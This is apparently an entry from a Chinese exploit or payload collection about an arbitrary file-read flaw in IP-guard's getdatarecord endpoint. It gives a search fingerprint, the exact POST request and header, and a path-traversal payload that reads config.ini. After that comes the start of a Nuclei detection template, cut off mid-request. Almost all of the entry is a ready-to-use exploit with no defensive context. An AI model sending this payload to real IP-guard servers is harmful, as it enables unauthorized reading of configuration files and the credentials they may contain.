# ip-guard-getdatarecord-任意文件读取漏洞

- **系统**：ip-guard-getdatarecord　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app="IP-guard"`
- **请求**：`POST /ipg/appr/MApplyList/downloadFile_client/getdatarecord HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
path=..%2Fconfig.ini&filename=1&action=download&hidGuid=1v%0D%0A
```

**其他**
- Nuclei验证: | id: IP-guard_getdatarecord_fileread<br/><br/>info:<br/>  name: IP-guard_getdatarecord_fileread<br/>  author: HK<br/>  severity: high<br/>  description: app="IP-guard"<br/>  reference:<br/>    - https://<br/>  tags: tags<br/><br/>http:<br/>  - raw:<br/>      - |-<br/>        POST /ipg/appr/MApplyList/downloadFile_client/getdatarecord HTTP/1.1<br/>        User-Agent: Mozilla/4.0 (compatible; MSIE